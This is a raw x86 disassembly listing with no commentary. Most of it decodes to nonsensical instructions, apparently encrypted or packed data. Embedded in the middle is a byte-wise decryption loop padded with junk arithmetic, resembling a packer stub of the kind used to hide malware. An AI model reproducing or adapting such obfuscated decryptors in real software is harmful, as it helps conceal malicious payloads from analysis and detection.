  414f0c:	push   eax
  414f0d:	(bad)  
  414f0e:	ret    
  414f0f:	xor    dl,dl
  414f11:	and    bh,0x6c
  414f14:	das    
  414f15:	test   eax,0xe6c9f1d7
  414f1a:	pop    es
  414f1b:	div    DWORD PTR [esi]
  414f1d:	retf   0xc668
  414f20:	gs dec ebp
  414f22:	mov    al,0x23
  414f24:	mov    ds:0x8e81b5b6,eax
  414f29:	(bad)  
  414f2a:	call   0x92a4725d
  414f2f:	shl    BYTE PTR [edi+0x54],cl
  414f32:	test   BYTE PTR [eax-0x6a9b4e8e],bh
  414f38:	je     0x414fab
  414f3a:	int    0x3e
  414f3c:	loope  0x414eda
  414f3e:	adc    eax,0xe2e32f5c
  414f43:	loop   0x414f0a
  414f45:	outs   dx,DWORD PTR ds:[esi]
  414f46:	mov    eax,0x97217112
  414f4b:	add    DWORD PTR [edx-0x5a],edi
  414f4e:	push   ebp
  414f4f:	pop    DWORD PTR [edi+0x4e]
  414f52:	(bad)  
  414f53:	std    
  414f54:	shl    DWORD PTR [ecx-0x53b65a4f],1
  414f5a:	push   ebp
  414f5b:	imul   ebp
  414f5d:	fisttp DWORD PTR [ecx]
  414f5f:	loop   0x414f5a
  414f61:	js     0x414f85
  414f63:	aam    0x5a
  414f65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f66:	sub    al,0x72
  414f68:	pop    eax
  414f69:	or     ebp,DWORD PTR [edi+0x55]
  414f6c:	rol    BYTE PTR [ecx+0x6c1c8973],0xa3
  414f73:	jge    0x414fb7
  414f75:	lahf   
  414f76:	jno    0x414ef8
  414f78:	dec    edi
  414f79:	inc    ebp
  414f7a:	mov    al,0x29
  414f7c:	aad    0x61
  414f7e:	inc    edi
  414f7f:	and    al,0x1d
  414f81:	adc    DWORD PTR [ecx+0x64],esi
  414f84:	mov    ss,WORD PTR [ebx+ecx*1]
  414f87:	data16 outs dx,BYTE PTR ds:[esi]
  414f89:	jae    0x414ff3
  414f8b:	test   eax,0x3895990
  414f90:	addr16 pop edx
  414f92:	mov    edx,0xbe009dc7
  414f97:	cmp    al,0x90
  414f99:	pop    edx
  414f9a:	repz or edx,DWORD PTR [esi]
  414f9d:	inc    ebp
  414f9e:	pop    edx
  414f9f:	std    
  414fa0:	(bad)  
  414fa1:	cld    
  414fa2:	int    0xf9
  414fa4:	jae    0x414fa5
  414fa6:	(bad)  
  414fa7:	mov    eax,0x2ac333f4
  414fac:	ins    BYTE PTR es:[edi],dx
  414fad:	lods   eax,DWORD PTR ds:[esi]
  414fae:	in     eax,dx
  414faf:	mov    al,0xda
  414fb1:	popf   
  414fb2:	jns    0x415024
  414fb4:	pop    esi
  414fb5:	loopne 0x414fd1
  414fb7:	mov    dh,0x62
  414fb9:	xor    dh,BYTE PTR [edx+eax*1]
  414fbc:	and    cl,BYTE PTR [edx-0x365286b4]
  414fc2:	mov    ds:0xe5995db2,eax
  414fc7:	imul   edi,DWORD PTR ds:0x57c7ce60,0x5
  414fce:	adc    BYTE PTR [ebx+edi*8+0x1dd9db93],al
  414fd5:	pushf  
  414fd6:	pop    esi
  414fd7:	fisttp DWORD PTR [edi+eax*8]
  414fda:	hlt    
  414fdb:	dec    ebp
  414fdc:	(bad)  
  414fdd:	push   ss
  414fde:	fisub  WORD PTR [edx+0x7f1a6e7a]
  414fe4:	cli    
  414fe5:	bound  edx,QWORD PTR ds:0xe7c2a50
  414feb:	xchg   ecx,eax
  414fec:	mov    dl,0x8c
  414fee:	retf   
  414fef:	mov    al,ds:0x8ee243a7
  414ff4:	ds sub ebx,eax
  414ff7:	out    0xce,al
  414ff9:	adc    DWORD PTR ds:0x106341a0,edi
  414fff:	test   al,0xa6
  415001:	mov    cl,0x18
  415003:	mov    al,ds:0x99a791c7
  415008:	fs cmp al,0xa
  41500b:	sub    DWORD PTR [ebp-0x7be8277c],eax
  415011:	jmp    0x16c76f73
  415016:	xchg   esp,eax
  415017:	repnz mov edi,?
  41501a:	sti    
  41501b:	push   ss
  41501c:	in     al,dx
  41501d:	(bad)  
  41501e:	retf   
  41501f:	int3   
  415020:	repnz sbb BYTE PTR [eax-0x1ed4b9c8],cl
  415027:	mov    edi,fs
  415029:	sti    
  41502a:	stos   BYTE PTR es:[edi],al
  41502b:	in     eax,dx
  41502c:	and    bh,al
  41502e:	mov    ah,0xb1
  415030:	xlat   BYTE PTR ds:[ebx]
  415031:	inc    eax
  415032:	jmp    0x1bb0d3d
  415037:	stos   DWORD PTR es:[edi],eax
  415038:	test   bh,0xdb
  41503b:	dec    ebp
  41503c:	dec    ebp
  41503d:	mov    edi,0xd027657a
  415042:	xor    edx,DWORD PTR [edi+0x6d3032e1]
  415048:	in     al,dx
  415049:	lea    ebx,[esi+0x57]
  41504c:	imul   ebx,DWORD PTR [edi+eiz*2+0x65106b2],0x96de8267
  415057:	add    dl,bl
  415059:	sti    
  41505a:	push   edi
  41505b:	jae    0x41508e
  41505d:	ficom  DWORD PTR [esi+esi*8+0xf]
  415061:	lods   eax,DWORD PTR ds:[esi]
  415062:	mov    cl,0xbe
  415064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415065:	ds out dx,al
  415067:	das    
  415068:	or     al,dl
  41506a:	add    ebx,ecx
  41506c:	or     ebx,ebp
  41506e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41506f:	in     eax,dx
  415070:	imul   edi,DWORD PTR ss:[eax-0x36],0x3a9e69a0
  415078:	(bad)  
  41507a:	fsub   QWORD PTR [edi-0x23]
  41507d:	aas    
  41507e:	push   edi
  41507f:	dec    esi
  415080:	push   esi
  415081:	jmp    0x415057
  415083:	ss jae 0x4150d5
  415086:	and    BYTE PTR [ecx],0x78
  415089:	mov    cs,ebx
  41508b:	(bad)  
  41508c:	mov    ebp,0xbc5cc026
  415091:	adc    edi,DWORD PTR [esp+ecx*4-0x652c9e74]
  415098:	out    dx,al
  415099:	(bad)  
  41509a:	pushf  
  41509b:	and    ah,BYTE PTR [edi+edi*4-0x60]
  41509f:	rcr    BYTE PTR [ebx+0x51],cl
  4150a2:	test   al,0x16
  4150a4:	das    
  4150a5:	fsubr  QWORD PTR [edx]
  4150a7:	out    0x78,eax
  4150a9:	sar    esp,1
  4150ab:	loope  0x4150e1
  4150ad:	pop    ebx
  4150ae:	leave  
  4150af:	jmp    0x7745:0x8c8c7c66
  4150b6:	call   0xcf524b65
  4150bb:	mov    al,ds:0x33cacd22
  4150c0:	pusha  
  4150c1:	mul    BYTE PTR [ecx+0x2764809f]
  4150c7:	mov    bl,0x84
  4150c9:	mov    ebx,0x37b3357f
  4150ce:	loopne 0x41510b
  4150d0:	enter  0x5329,0xa3
  4150d4:	out    dx,eax
  4150d5:	xor    dl,dl
  4150d7:	(bad)  
  4150d9:	cmp    al,0xcd
  4150db:	jne    0x4150e9
  4150dd:	add    eax,0xeb863b49
  4150e2:	das    
  4150e3:	pusha  
  4150e4:	pusha  
  4150e5:	mov    ds:0xcde2441d,eax
  4150ea:	jno    0x415083
  4150ec:	sahf   
  4150ed:	pop    edx
  4150ee:	sbb    BYTE PTR [edx+0x3e],bl
  4150f1:	jne    0x415125
  4150f3:	mov    ecx,0xcd8faea2
  4150f8:	mov    bl,0xdb
  4150fa:	push   ss
  4150fb:	out    dx,al
  4150fc:	pushf  
  4150fd:	jg     0x415146
  4150ff:	test   BYTE PTR [ebp+0x1c],dh
  415102:	popa   
  415103:	xor    DWORD PTR [ebp+0x337661bb],0x33
  41510a:	cmp    ah,al
  41510c:	clc    
  41510d:	nop
  41510e:	xor    BYTE PTR ds:0x1de64cf4,dh
  415114:	gs pop ecx
  415116:	add    BYTE PTR [ecx],ah
  415118:	fild   WORD PTR [esi]
  41511a:	fisubr DWORD PTR [edi]
  41511c:	lods   al,BYTE PTR ds:[esi]
  41511d:	shl    DWORD PTR [ebx-0x13b3665d],0xf5
  415124:	shl    DWORD PTR [edx-0x51659814],1
  41512a:	lods   eax,DWORD PTR ds:[esi]
  41512b:	mov    edi,0xd4d19074
  415130:	bound  ebp,QWORD PTR ds:0x82031c7d
  415136:	mov    edx,0x699a6100
  41513b:	jae    0x415133
  41513d:	ss shr al,0xa5
  415141:	neg    DWORD PTR [esi+0x7c]
  415144:	jae    0x41511d
  415146:	push   edx
  415147:	adc    ebx,DWORD PTR [eax+0x381a3ae9]
  41514d:	(bad)  
  41514f:	cmp    DWORD PTR [ebp+0xe],edx
  415152:	and    eax,0x7055451
  415157:	lea    eax,[esi-0x12]
  41515a:	and    DWORD PTR [edx],0xffffffaf
  41515d:	data16 mov ds:0x83b60296,al
  415163:	retf   0xb4c5
  415166:	mov    dh,al
  415168:	in     eax,dx
  415169:	lods   al,BYTE PTR ds:[esi]
  41516a:	inc    esp
  41516b:	sub    ecx,ebx
  41516d:	push   ecx
  41516e:	call   0x893422f6
  415173:	shr    BYTE PTR [edi-0x6d6ed0c6],1
  415179:	rcl    DWORD PTR [ecx-0x4],1
  41517c:	cli    
  41517d:	not    DWORD PTR [edx]
  41517f:	je     0x41592b
  415185:	mov    DWORD PTR [ebp-0x18],0x1001
  41518c:	mov    edx,DWORD PTR [ebp-0x1c]
  41518f:	xor    ecx,ecx
  415191:	test   edx,edx
  415193:	jmp    0x4154cc
  415198:	jno    0x4151dd
  41519a:	mov    edx,0xb9bcbc52
  41519f:	fs inc eax
  4151a1:	sub    BYTE PTR [edx],bh
  4151a3:	xchg   edx,eax
  4151a4:	lods   eax,DWORD PTR ds:[esi]
  4151a5:	push   eax
  4151a6:	sahf   
  4151a7:	nop
  4151a8:	cmp    al,0xb0
  4151aa:	mov    esi,0xbec4edbe
  4151af:	mov    esi,0xc2483257
  4151b4:	xor    bl,cl
  4151b6:	cwde   
  4151b7:	out    dx,eax
  4151b8:	popa   
  4151b9:	sub    al,0xfc
  4151bb:	int    0x3e
  4151bd:	test   ebx,edi
  4151bf:	adc    al,0x7f
  4151c1:	pop    es
  4151c2:	sbb    eax,0x35d34158
  4151c7:	mov    ebp,0xa4486cb3
  4151cc:	push   0xfffffff5
  4151ce:	pop    edi
  4151cf:	mov    cl,0xcf
  4151d1:	retf   
  4151d2:	mov    bl,0x8b
  4151d4:	fisubr WORD PTR [edx+0x7b]
  4151d7:	push   edi
  4151d8:	mov    al,BYTE PTR [edi+0x2ec08050]
  4151de:	out    dx,al
  4151df:	in     eax,dx
  4151e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e1:	jge    0x415219
  4151e3:	mov    eax,ds:0x17ed561f
  4151e8:	retf   0x2ff3
  4151eb:	inc    ebx
  4151ec:	pop    esp
  4151ed:	fisttp DWORD PTR [eax]
  4151ef:	call   edx
  4151f1:	pushf  
  4151f2:	adc    DWORD PTR [edi+0x14],esi
  4151f5:	add    dl,BYTE PTR [ebx+eiz*4+0x5f]
  4151f9:	sub    al,0xd4
  4151fb:	adc    al,0x4f
  4151fd:	sbb    DWORD PTR ds:0x5e1caa3b,esi
  415203:	dec    ecx
  415204:	outs   dx,BYTE PTR ds:[esi]
  415205:	or     ch,BYTE PTR [ecx]
  415207:	dec    ecx
  415208:	inc    edi
  415209:	(bad)  
  41520a:	pop    ebx
  41520b:	inc    ecx
  41520c:	stos   BYTE PTR es:[edi],al
  41520d:	inc    esi
  41520e:	sbb    BYTE PTR [ebp-0x52],0xa6
  415212:	(bad)  [edx-0x3f]
  415215:	out    0xdb,al
  415217:	ror    ah,cl
  415219:	and    al,0x1a
  41521b:	cmp    al,0xcd
  41521d:	mov    edi,?
  41521f:	sbb    DWORD PTR [eax+edx*1-0x1f5dba4],ebp
  415226:	pop    ds
  415227:	dec    ebx
  415228:	in     al,dx
  415229:	fsub   DWORD PTR [edi-0x4e4c7a72]
  41522f:	inc    ebp
  415230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415231:	adc    ecx,DWORD PTR [edx]
  415233:	push   ebx
  415234:	rol    DWORD PTR [ebp-0x1469ad1f],0x5
  41523b:	pop    esi
  41523c:	in     eax,0x55
  41523e:	retf   
  41523f:	jno    0x41527d
  415241:	and    ch,bh
  415243:	push   0x9bf82ec9
  415248:	shl    BYTE PTR [eax+0x74],1
  41524b:	or     dl,BYTE PTR [ecx+esi*2]
  41524e:	sbb    ecx,DWORD PTR [ebx-0x4e0843d2]
  415254:	mov    dh,0xf2
  415256:	lea    ecx,[edi+ecx*1]
  415259:	mov    bh,BYTE PTR [ebx+0x17412f23]
  41525f:	adc    DWORD PTR [edx],esp
  415261:	sub    eax,0x45b335d
  415266:	gs push ebx
  415268:	in     al,dx
  415269:	call   0xbb49ce9d
  41526e:	sub    al,0x19
  415270:	or     BYTE PTR [edi-0x262f612b],ah
  415276:	pop    eax
  415277:	dec    ebx
  415278:	mov    cl,0xc8
  41527a:	add    DWORD PTR [ecx-0x41],edx
  41527d:	mov    esp,0x45784fb
  415282:	retf   
  415283:	xchg   ecx,eax
  415284:	or     ch,BYTE PTR [edi+0x1a58a0c]
  41528a:	fs xor eax,0xa43f3b6f
  415290:	ret    
  415291:	mul    DWORD PTR fs:[ebx+eax*4-0x4aacac74]
  415299:	pushf  
  41529a:	cmp    BYTE PTR [edx+eax*4],al
  41529d:	mov    ecx,0x897a0789
  4152a2:	ret    
  4152a3:	lock xchg edi,eax
  4152a5:	xor    al,0x2
  4152a7:	sar    DWORD PTR [edi-0x4c],0x5a
  4152ab:	sbb    edi,DWORD PTR [edx+0x5cca67fa]
  4152b1:	les    ebx,FWORD PTR [edx]
  4152b3:	sbb    DWORD PTR [ebp-0x3d],esi
  4152b6:	repz sub edx,DWORD PTR [ecx]
  4152b9:	push   es
  4152ba:	push   esi
  4152bb:	pop    es
  4152bc:	jno    0x4152d2
  4152be:	sub    DWORD PTR [edi+ebx*4],ebx
  4152c1:	and    eax,0xe0db3c76
  4152c6:	mov    ch,0xf2
  4152c8:	or     ebp,ebp
  4152ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152cb:	mov    es,WORD PTR [edx-0x44]
  4152ce:	enter  0xde5a,0x55
  4152d2:	pop    es
  4152d3:	inc    ecx
  4152d4:	sbb    ebx,DWORD PTR [edi-0x7]
  4152d7:	mov    bh,0x5f
  4152d9:	test   al,0xdf
  4152db:	adc    eax,0xe956eae9
  4152e0:	out    dx,eax
  4152e1:	mov    bh,0xcb
  4152e3:	xchg   edi,eax
  4152e4:	pop    es
  4152e5:	cli    
  4152e6:	mov    BYTE PTR [esi+0x4a],al
  4152e9:	shl    DWORD PTR [ebp-0x6b],1
  4152ec:	inc    ebx
  4152ed:	stos   BYTE PTR es:[edi],al
  4152ee:	and    eax,0x4810912d
  4152f3:	int3   
  4152f4:	cmp    DWORD PTR [esi+0x631bd571],esp
  4152fa:	xor    ecx,DWORD PTR [edi-0x28eaa88b]
  415300:	popf   
  415301:	iret   
  415302:	xor    al,BYTE PTR [ecx+0x42de04f2]
  415308:	or     esp,DWORD PTR [edi+0xc30d634]
  41530e:	fimul  WORD PTR [esi+ecx*8-0x1d5f629a]
  415315:	jg     0x4152d0
  415317:	cmp    ebp,esi
  415319:	xchg   DWORD PTR [esi-0x35],esi
  41531c:	inc    edi
  41531d:	scas   al,BYTE PTR es:[edi]
  41531e:	sbb    ecx,edi
  415320:	and    BYTE PTR [ebx],0x8
  415323:	add    al,ch
  415325:	(bad)  
  415327:	jnp    0x4152b2
  415329:	popf   
  41532a:	mov    ds:0xcb37a945,al
  41532f:	test   eax,0xa7c7c442
  415334:	pop    ebx
  415335:	pop    eax
  415336:	inc    ebp
  415337:	and    eax,0xa4ad09cc
  41533c:	sbb    dh,BYTE PTR [ecx-0x4925a8bb]
  415342:	in     eax,0x19
  415344:	scas   eax,DWORD PTR es:[edi]
  415345:	rcl    edx,1
  415347:	fistp  DWORD PTR [edi]
  415349:	cmp    al,0xc0
  41534b:	retf   0x92e4
  41534e:	pop    edx
  41534f:	nop
  415350:	jge    0x415337
  415352:	div    DWORD PTR [ecx-0x72e24d0c]
  415358:	clc    
  415359:	into   
  41535a:	ror    BYTE PTR [eax-0x28a4a657],cl
  415360:	add    esp,DWORD PTR [edx]
  415362:	popa   
  415363:	push   cs
  415364:	mov    dl,BYTE PTR [ecx+eiz*2]
  415367:	mov    WORD PTR [ebx-0x782f6c16],?
  41536d:	pop    ss
  41536e:	es xchg esi,eax
  415370:	sub    dh,bl
  415372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415373:	mov    edx,0x7a79e2e0
  415378:	or     ebp,DWORD PTR [ebp-0x32cb87b5]
  41537e:	ins    DWORD PTR es:[edi],dx
  41537f:	aad    0xaa
  415381:	dec    edx
  415382:	cmp    bl,BYTE PTR [eax-0x7c3858d0]
  415388:	fadd   QWORD PTR [ebx+0x4a230132]
  41538e:	sbb    edx,DWORD PTR [ebx+0x638d6d7b]
  415394:	jbe    0x415361
  415396:	or     al,bl
  415398:	mov    ch,0xc
  41539a:	adc    BYTE PTR [eax-0x7f],ch
  41539d:	sub    eax,0x6c18224e
  4153a2:	mov    al,ds:0x1fdffb0f
  4153a7:	outs   dx,BYTE PTR ds:[esi]
  4153a8:	cmp    DWORD PTR [ebx-0x30],esp
  4153ab:	adc    ch,cl
  4153ad:	or     cl,BYTE PTR [eax-0x460f115a]
  4153b3:	and    bl,ah
  4153b5:	in     eax,0xdb
  4153b7:	scas   eax,DWORD PTR es:[edi]
  4153b8:	jne    0x4153ab
  4153ba:	in     al,0xf0
  4153bc:	pop    ecx
  4153bd:	sub    bl,BYTE PTR [edi]
  4153bf:	add    bl,bh
  4153c1:	sub    DWORD PTR [eax-0x49],edi
  4153c4:	aaa    
  4153c5:	test   BYTE PTR [edi+eiz*1-0x23],bl
  4153c9:	mov    al,0x15
  4153cb:	mov    al,ds:0x60aecea2
  4153d0:	adc    ecx,DWORD PTR [esi-0x7e]
  4153d3:	mov    dh,0x79
  4153d5:	das    
  4153d6:	inc    ebp
  4153d7:	push   0x7727c682
  4153dc:	lahf   
  4153dd:	loope  0x4153da
  4153df:	stos   DWORD PTR es:[edi],eax
  4153e0:	mov    ds:0x760a5eab,eax
  4153e5:	mov    eax,ds:0x1cde7890
  4153ea:	fwait
  4153eb:	pusha  
  4153ec:	jmp    0x4249840d
  4153f1:	(bad)  
  4153f2:	iret   
  4153f3:	sahf   
  4153f4:	sar    DWORD PTR [ecx+eiz*8+0x61],1
  4153f8:	or     BYTE PTR [ebp-0x1fa0e2f0],dh
  4153fe:	push   ds
  4153ff:	cmp    BYTE PTR [eax+0x7a],0x42
  415403:	nop
  415404:	jnp    0x4153dc
  415406:	jne    0x415450
  415408:	add    DWORD PTR [eax],ebx
  41540a:	loop   0x4153cb
  41540c:	inc    edx
  41540d:	lahf   
  41540e:	scas   eax,DWORD PTR es:[edi]
  41540f:	push   eax
  415410:	push   esp
  415411:	stos   BYTE PTR es:[edi],al
  415412:	fs mov ebx,0x84cbc2a3
  415418:	sahf   
  415419:	xor    BYTE PTR [esi],0xf8
  41541c:	xchg   ebp,eax
  41541d:	push   es
  41541e:	retf   
  41541f:	sbb    BYTE PTR [eax+0x45],cl
  415422:	pop    esi
  415423:	repz mov ebp,0xfb2d7b8a
  415429:	sbb    al,0x9a
  41542b:	xchg   esp,eax
  41542c:	test   al,0x0
  41542e:	or     eax,0xc84a92e6
  415433:	mov    eax,ds:0x8cc58f58
  415438:	and    al,0xd2
  41543a:	jle    0x4154a1
  41543c:	xchg   bh,dh
  41543e:	mov    edi,0x1c8e367b
  415443:	fs mov cl,0x25
  415446:	dec    edx
  415447:	in     al,dx
  415448:	and    al,0x7
  41544a:	jl     0x4153f3
  41544c:	adc    DWORD PTR [edx+0x39b4de29],esp
  415452:	jb     0x4154ac
  415454:	dec    eax
  415455:	mov    ds:0x72769a1d,al
  41545a:	test   DWORD PTR [edi-0x5e],ecx
  41545d:	push   ds
  41545e:	(bad)  
  41545f:	ror    BYTE PTR [esi+0x72023134],0xf2
  415466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415467:	lods   al,BYTE PTR ds:[esi]
  415468:	retf   0x8112
  41546b:	bound  esi,QWORD PTR [ebx+0x26]
  41546e:	add    DWORD PTR [ebx],ebp
  415470:	arpl   bx,dx
  415472:	xlat   BYTE PTR ds:[ebx]
  415473:	inc    ebx
  415474:	pop    edx
  415475:	sar    DWORD PTR [ebx-0x20],1
  415478:	push   ds
  415479:	pop    esp
  41547a:	cmp    al,0xc5
  41547c:	and    dl,BYTE PTR [esi+0x3a]
  41547f:	pop    eax
  415480:	mov    esi,0x20f055af
  415485:	test   eax,0xf76ad48c
  41548a:	push   es
  41548b:	ret    0x50c9
  41548e:	mov    eax,0x6f74c7a9
  415493:	outs   dx,DWORD PTR ds:[esi]
  415494:	add    DWORD PTR [eax],edx
  415496:	cmp    DWORD PTR [edi+0x5af8fa60],esp
  41549c:	(bad)  
  41549d:	dec    ecx
  41549e:	or     al,bh
  4154a0:	ins    DWORD PTR es:[edi],dx
  4154a1:	dec    eax
  4154a3:	out    dx,al
  4154a4:	and    esi,DWORD PTR [ecx]
  4154a6:	or     eax,0x6076d278
  4154ab:	or     al,0x77
  4154ad:	push   es
  4154ae:	mov    esi,0xcdfb5302
  4154b3:	mov    bh,0x60
  4154b5:	ficom  WORD PTR [ebx]
  4154b7:	sbb    ecx,DWORD PTR [eax]
  4154b9:	mov    dl,0xae
  4154bb:	(bad)  
  4154bc:	hlt    
  4154bd:	lea    ecx,[edx+eiz*1+0x2483728d]
  4154c4:	lods   eax,DWORD PTR ds:[esi]
  4154c5:	xchg   esp,eax
  4154c6:	lods   al,BYTE PTR ds:[esi]
  4154c7:	sahf   
  4154c8:	ret    
  4154c9:	cld    
  4154ca:	(bad)  
  4154cb:	aam    0xf
  4154cd:	test   BYTE PTR [esi+0x0],bh
  4154d0:	add    BYTE PTR [eax],al
  4154d2:	mov    al,BYTE PTR [ecx+edi*1]
  4154d5:	mov    BYTE PTR [ebp-0x1],al
  4154d8:	mov    BYTE PTR [ebp-0x3],0x74
  4154dc:	mov    BYTE PTR [ebp-0x2],0x16
  4154e0:	mov    BYTE PTR [ebp-0x4],0x62
  4154e4:	movzx  eax,BYTE PTR [ebp-0x4]
  4154e8:	movzx  ebx,BYTE PTR [ebp-0x2]
  4154ec:	or     eax,0xd4
  4154f1:	and    eax,ebx
  4154f3:	movzx  ebx,BYTE PTR [ebp-0x3]
  4154f7:	and    eax,ebx
  4154f9:	mov    BYTE PTR [ebp-0x12],al
  4154fc:	mov    BYTE PTR [ebp-0x11],0xfe
  415500:	mov    BYTE PTR [ebp-0x14],0x32
  415504:	mov    BYTE PTR [ebp-0x4],0xc7
  415508:	mov    BYTE PTR [ebp-0x2],0x73
  41550c:	mov    BYTE PTR [ebp-0x3],0xb3
  415510:	mov    al,BYTE PTR [ebp-0x3]
  415513:	mov    bl,BYTE PTR [ebp-0x2]
  415516:	or     al,bl
  415518:	mov    bl,BYTE PTR [ebp-0x4]
  41551b:	sub    al,bl
  41551d:	mov    bl,BYTE PTR [ebp-0x14]
  415520:	imul   bl
  415522:	mov    bl,BYTE PTR [ebp-0x11]
  415525:	sub    al,bl
  415527:	mov    bl,BYTE PTR [ebp-0x12]
  41552a:	cmp    bl,al
  41552c:	ja     0x415541
  415532:	movzx  eax,BYTE PTR [ebp-0x1]
  415536:	sub    eax,0xed
  41553b:	mov    BYTE PTR [ebp-0x1],al
  41553e:	ror    BYTE PTR [ebp-0x1],1
  415541:	mov    al,BYTE PTR [ebp-0x1]
  415544:	mov    BYTE PTR [ecx+edi*1],al
  415547:	inc    ecx
  415548:	cmp    ecx,edx
  41554a:	jb     0x4154d2
  415550:	dec    DWORD PTR [ebp-0x18]
  415553:	jne    0x41518c
  415559:	mov    eax,DWORD PTR [ebp+0x8]
  41555c:	mov    ecx,DWORD PTR [ebp+0xc]
  41555f:	shrd   eax,ecx,0x2
  415563:	shr    ecx,0x2
  415566:	mov    ecx,DWORD PTR [ebp+0x8]
  415569:	mov    edx,DWORD PTR [ebp+0xc]
  41556c:	xor    eax,esi
  41556e:	xor    edx,edx
  415570:	jmp    0x4158a9
  415575:	cmp    dl,BYTE PTR [ebx]
  415577:	inc    esi
  415578:	mov    WORD PTR [eax-0x64],gs
  41557b:	cmp    al,0xb3
  41557d:	mov    ch,0xd8
  41557f:	(bad)  
  415580:	fstp   QWORD PTR [edx+0x67]
  415583:	mov    dl,0xcf
  415585:	ins    BYTE PTR es:[edi],dx
  415586:	mov    dh,0xbe
  415588:	mov    esi,0xbebec4ed
  41558d:	in     eax,0x4e
  41558f:	pushf  
  415590:	shr    DWORD PTR [ebx],0xb8
  415593:	stos   DWORD PTR es:[edi],eax
  415594:	adc    esi,DWORD PTR [edi-0x54ad236e]
  41559a:	shr    ecx,cl
  41559c:	push   ebp
  41559d:	lock push esp
  41559f:	jnp    0x415532
  4155a1:	and    eax,0xc809b6c1
  4155a6:	idiv   DWORD PTR ds:0x57ce6040
  4155ac:	xor    eax,0xeea80e67
  4155b1:	cmp    al,0x98
  4155b3:	cmp    BYTE PTR [edi-0x1e],dh
  4155b6:	iret   
  4155b7:	xchg   esp,eax
  4155b8:	mov    ebp,edx
  4155ba:	mov    esi,0xf19d4952
  4155bf:	jecxz  0x415555
  4155c1:	call   0xa1cb320b
  4155c6:	in     eax,0xed
  4155c8:	sti    
  4155c9:	cmp    eax,0xf590d40e
  4155ce:	mov    edx,0xccb00baa
  4155d3:	jmp    0x38c1:0xc574688d
  4155da:	lock mov edi,0x1150862f
  4155e0:	pop    ss
  4155e1:	inc    ebp
  4155e2:	xchg   BYTE PTR [edx+0x33],ah
  4155e5:	shl    BYTE PTR [ecx-0x7655688a],1
  4155eb:	fisub  WORD PTR [edx+ebp*1]
  4155ee:	inc    eax
  4155ef:	retf   0x7792
  4155f2:	and    al,0xd1
  4155f4:	add    BYTE PTR [edi+0x7d],dh
  4155f7:	repz scas al,BYTE PTR es:[edi]
  4155f9:	or     BYTE PTR cs:[edi-0x49dce73c],0x2d
  415601:	jb     0x415671
  415603:	test   eax,0x4505fe18
  415608:	push   edi
  415609:	shr    esi,1
  41560b:	adc    bl,ch
  41560d:	pop    eax
  41560e:	addr16 dec edx
  415610:	xchg   ebp,eax
  415611:	push   ecx
  415612:	test   BYTE PTR [edi+ecx*1-0x24],al
  415616:	jecxz  0x4155f2
  415618:	or     eax,0x4ae09bf
  41561d:	cmp    al,0xa7
  41561f:	addr16 cld 
  415621:	or     BYTE PTR ds:0x92b8632c,0x7e
  415628:	outs   dx,BYTE PTR ds:[esi]
  415629:	scas   al,BYTE PTR es:[edi]
  41562a:	mov    al,0x6a
  41562c:	sub    al,0xc9
  41562e:	leave  
  41562f:	sub    bl,BYTE PTR [ebx-0x39]
  415632:	adc    ebx,0xd39c51b4
  415638:	stc    
  415639:	pop    esp
  41563a:	sub    BYTE PTR [ecx-0xb],al
  41563d:	mov    esp,0x5ec0423c
  415642:	xchg   ebp,eax
  415643:	enter  0x4aaa,0xd3
  415647:	retf   
  415648:	sub    ch,BYTE PTR [eax]
  41564a:	sti    
  41564b:	imul   edx,ecx,0xffffffa9
  41564e:	loopne 0x41568d
  415650:	pop    ebx
  415651:	sahf   
  415652:	test   eax,0x127d2f38
  415657:	test   BYTE PTR [ebx],cl
  415659:	cmp    eax,0xbf84da4
  41565e:	mov    ecx,0xd07f262e
  415663:	dec    eax
  415664:	imul   esp,DWORD PTR [ebx+0x43],0xf11e6a6f
  41566b:	sub    al,0xfa
  41566d:	add    eax,DWORD PTR [ecx+0x64]
  415670:	adc    bh,cl
  415672:	push   ds
  415673:	icebp  
  415674:	push   edi
  415675:	add    eax,0xb4434cf6
  41567a:	rcr    DWORD PTR [ecx],0xe
  41567d:	sbb    edi,edx
  41567f:	ret    
  415680:	ja     0x415638
  415682:	sub    al,0xa7
  415684:	adc    al,0x9f
  415686:	jo     0x4156f6
  415688:	sahf   
  415689:	(bad)  
  41568a:	fiadd  DWORD PTR [eax-0x3d8e21af]
  415690:	ret    0x11f6
  415693:	daa    
  415694:	pop    ds
  415695:	xor    eax,0xb4d68f4
  41569a:	lods   eax,DWORD PTR ds:[esi]
  41569b:	and    eax,0xbbce3829
  4156a0:	or     BYTE PTR [eax],0xcb
  4156a3:	dec    eax
  4156a4:	dec    esi
  4156a5:	lods   al,BYTE PTR cs:[esi]
  4156a7:	and    DWORD PTR [esi+0x403c9ec9],ecx
  4156ad:	call   0x86fc:0x78b4b4e4
  4156b4:	and    BYTE PTR [ebx-0x3beda411],bl
  4156ba:	hlt    
  4156bb:	mov    ds:0xb98f67f2,eax
  4156c0:	and    eax,DWORD PTR [ebx+ecx*4-0x27]
  4156c4:	clc    
  4156c5:	fisttp WORD PTR [edi-0x667f447a]
  4156cb:	or     esi,0xffffffa4
  4156ce:	dec    ebp
  4156cf:	pop    edx
  4156d0:	adc    DWORD PTR [ecx],edi
  4156d2:	cld    
  4156d3:	popf   
  4156d4:	pop    ebp
  4156d5:	fwait
  4156d6:	jno    0x4156ae
  4156d8:	push   ecx
  4156d9:	mov    ds:0x306bb495,al
  4156de:	jae    0x415759
  4156e0:	jp     0x8780b054
  4156e6:	nop
  4156e7:	jge    0x41575f
  4156e9:	jne    0x4156aa
  4156eb:	(bad)  
  4156ee:	jle    0x415769
  4156f0:	xchg   esi,eax
  4156f1:	pop    ebx
  4156f2:	pop    edi
  4156f3:	div    DWORD PTR [ebp-0x70]
  4156f6:	push   ds
  4156f7:	xor    ebp,DWORD PTR [edi-0x6]
  4156fa:	sub    ecx,eax
  4156fc:	repnz jmp 0x1d88:0xb187a3ff
  415704:	sub    ecx,edx
  415706:	jns    0x4156be
  415708:	dec    edi
  415709:	rcl    ah,1
  41570b:	xor    eax,0xb819c854
